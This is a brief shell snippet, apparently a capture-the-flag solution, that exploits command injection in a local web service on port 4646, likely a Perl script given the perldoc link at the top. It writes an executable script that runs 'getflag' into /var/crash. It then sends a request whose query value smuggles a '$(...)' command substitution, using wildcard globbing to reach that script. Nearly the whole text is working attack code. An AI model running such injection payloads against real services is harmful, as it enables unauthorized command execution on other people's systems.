# https://perldoc.perl.org/perlop#Quote-and-Quote-like-Operators

echo -e '#!/bin/bash\ngetflag>/var/crash/key' > /var/crash/RUN

chmod +x /var/crash/RUN

curl http://localhost:4646?x='$(/*/*/RUN)'